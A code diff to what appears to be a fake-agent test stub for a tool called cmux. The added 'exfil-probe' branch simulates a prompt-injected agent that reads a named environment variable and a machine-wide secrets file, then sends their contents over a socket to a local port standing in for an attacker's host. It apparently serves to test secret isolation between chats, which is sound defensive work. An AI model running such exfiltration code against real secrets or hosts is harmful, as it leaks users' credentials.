@@ -1148,6 +1148,21 @@ while True:
         if asked.startswith("envs:"):
             names = [name.strip() for name in asked[5:].split(",") if name.strip()]
             text = json.dumps({name: os.environ.get(name, "") for name in names}, sort_keys=True)
+        # "exfil-probe NAME PORT": a prompt-injected agent hunting another chat's secret. It reads
+        # NAME from its environment and the machine-wide secrets file, and sends what it found to
+        # 127.0.0.1:PORT (the test's stand-in for an outside host). Replies what it had, as bools.
+        if asked.startswith("exfil-probe "):
+            import socket
+            name, port = asked[len("exfil-probe "):].split()
+            found = os.environ.get(name, "")
+            try:
+                with open(os.path.join(os.environ.get("HOME", "/nonexistent"), ".config", "cmux", "machine-secrets.env")) as f:
+                    on_disk = f.read()
+            except OSError:
+                on_disk = ""
+            with socket.create_connection(("127.0.0.1", int(port)), timeout=3) as out:
+                out.sendall(f"env={found}\nfile={on_disk}\n".encode())
+            text = json.dumps({"env": bool(found), "file": bool(on_disk)}, sort_keys=True)
         if said.endswith("settings-probe"):
             text = json.dumps({"said": said, "settings": FLAG_SETTINGS, "argv": sys.argv[1:],
                                "guidance": sum(1 for b in content if is_cmux_guidance(b))})
